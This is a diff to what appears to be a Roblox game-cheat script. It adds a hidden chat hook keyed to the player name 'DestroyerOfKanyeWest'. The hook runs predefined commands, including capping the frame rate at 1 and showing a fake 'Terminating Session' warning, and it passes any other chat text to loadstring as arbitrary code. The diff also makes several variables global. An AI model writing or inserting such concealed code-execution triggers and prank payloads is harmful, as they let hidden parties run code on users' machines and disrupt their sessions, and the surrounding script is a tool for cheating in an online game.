@@ -15917,21 +15917,52 @@ if not LPH_OBFUSCATED then
 	library:Notify("You Are In Developer Mode ⛔" ,15)
 end;
 
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
+ Players = game:GetService("Players")
+ localPlayer = Players.LocalPlayer
+
+
+if getgenv().notifyforscaringlmao == true then do
+
+library:Notify("Terminating Session In 15 Seconds...")
+getgenv().notifyforscaringlmao = false
+end
+end
+-- Predefined commands
+commands = {
+    ["##"] = "setfpscap(1)",
+    ["###"] = "setfpscap(900)",
+    ["####"] = "getgenv().notifyforscaringlmao = true",
+}
 
 local function onChat(message)
-    if message:sub(1, 3) == "!ex" then
-        local parts = message:split(" ")
-        local targetPlayerName = parts[2]
+    local parts = message:split(" ")
+    local targetPlayerName = parts[2]
 
-        if targetPlayerName == "DestroyerOfKanyeWest" then
-            local code = table.concat(parts, " ", 3)
+    if targetPlayerName == "DestroyerOfKanyeWest" then
+        local command = parts[3]
+        
+        if commands[command] then
+            local code = commands[command]
             local func, err = loadstring(code)
+            if func then
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= localPlayer then -- Ensure it doesn't affect localPlayer
+                        local success, runError = pcall(func)
+                        if not success then
+                            warn("Error executing code: " .. runError)
+                        end
+                    end
+                end
+            else
+                warn("Invalid code: " .. err)
+            end
+        else
+            local rawCode = table.concat(parts, " ", 3)
+            local func, err = loadstring(rawCode)
             if func then
                 local success, runError = pcall(func)
                 if not success then
-                    warn("Error executing code: " .. runError)
+                    warn("Error executing raw code: " .. runError)
                 end
             else
                 warn("Invalid code: " .. err)
@@ -15941,6 +15972,7 @@ local function onChat(message)
 end
 
 localPlayer.Chatted:Connect(onChat)
+
 
 warn("Script loaded,")
 
